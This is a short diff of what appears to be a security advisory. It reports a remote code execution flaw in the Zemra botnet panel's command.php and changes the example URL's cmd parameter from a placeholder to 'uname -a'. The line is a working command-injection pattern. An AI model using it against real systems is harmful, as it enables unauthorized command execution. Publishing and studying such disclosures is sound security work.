@@ -2,7 +2,7 @@
 
 Type: Remote Code Execution
 
-Vuln: http://localhost/Zemra/Panel/Zemra/system/command.php?cmd=<payload here>
+Vuln: http://localhost/Zemra/Panel/Zemra/system/command.php?cmd=uname -a
 
 Author: [shipcod3 / Jay Turla](https://twitter.com/shipcod3)
 
